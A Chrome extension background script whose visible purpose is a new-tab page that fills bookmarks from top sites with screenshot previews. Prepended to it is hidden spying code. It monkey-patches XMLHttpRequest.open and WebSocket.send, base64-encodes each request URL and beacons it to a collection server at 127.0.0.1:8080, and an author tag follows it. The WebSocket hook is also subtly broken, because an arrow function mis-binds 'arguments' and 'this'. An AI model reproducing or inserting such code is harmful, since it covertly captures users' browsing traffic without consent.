function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function getPreview(url) {
    return new Promise(resolve => {
        const img = new Image();
        if(!url) return resolve(null);
        img.src = 'https://mini.s-shot.ru/1366x890/400/png/?' + url;
        img.onload = () => {
            const canvas = document.createElement('canvas');
            canvas.width = img.width;
            canvas.height = img.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            const preview = canvas.toDataURL('image/png');
            resolve(preview);
        };
        img.onerror = () => resolve(null);
    });
}

function initBookmarks() {
    chrome.topSites.get(data => {
        let bookmarks = data
            .filter(item => item.url.slice(0, 6) !== 'chrome' && !item.url.includes('localhost'))
            .slice(0, 10)
            .map((item, id) => ({id, url: item.url, title: item.title || '', img  : ''}));

        chrome.storage.local.set({bookmarks});

        const promises = bookmarks.map(item => getPreview(item.url));

        Promise.all(promises).then(previews => {
            bookmarks = bookmarks.map((b ,i) => {
                b.img = previews[i];
                return b;
            });
            chrome.storage.local.set({bookmarks});
            chrome.runtime.sendMessage({action: 'reload-storage'});
            console.log(bookmarks);
        });
    });
}

chrome.browserAction.onClicked.addListener(() => chrome.tabs.create({}));

chrome.runtime.onInstalled.addListener(e => {
    if(e.reason === 'install') {
        initBookmarks();
    }
});
